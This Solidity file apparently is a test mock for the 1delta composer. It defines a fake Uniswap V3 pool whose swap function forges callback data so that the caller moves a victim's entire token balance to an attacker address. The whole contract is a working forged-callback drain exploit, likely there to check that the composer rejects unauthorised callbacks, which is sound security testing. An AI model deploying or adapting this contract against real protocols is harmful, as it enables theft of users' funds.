// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {CalldataLib} from "contracts/utils/CalldataLib.sol";
import {DexTypeMappings} from "contracts/1delta/composer/swappers/dex/DexTypeMappings.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousPoolV3 {
    bytes32 private constant SELECTOR_UNIV3 = 0xfa461e3300000000000000000000000000000000000000000000000000000000;

    address public victim;
    address public attacker;
    address public tokenToSteal;

    constructor(address _victim, address _attacker, address _tokenToSteal) {
        victim = _victim;
        attacker = _attacker;
        tokenToSteal = _tokenToSteal;
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    )
        external
        returns (int256 amount0, int256 amount1)
    {
        uint256 victimBalance = IERC20(tokenToSteal).balanceOf(victim);
        require(victimBalance > 0, "Victim has no balance");

        bytes memory transferCall = CalldataLib.encodeTransferIn(tokenToSteal, attacker, victimBalance);

        bytes memory callbackData = abi.encodePacked(
            victim, tokenToSteal, address(0), uint8(DexTypeMappings.UNISWAP_V3_ID), uint16(500), uint16(transferCall.length), transferCall
        );

        (bool success,) = msg.sender.call(abi.encodeWithSelector(bytes4(SELECTOR_UNIV3), int256(1), int256(0), callbackData));

        require(success, "Callback failed");

        return (1, 0);
    }
}


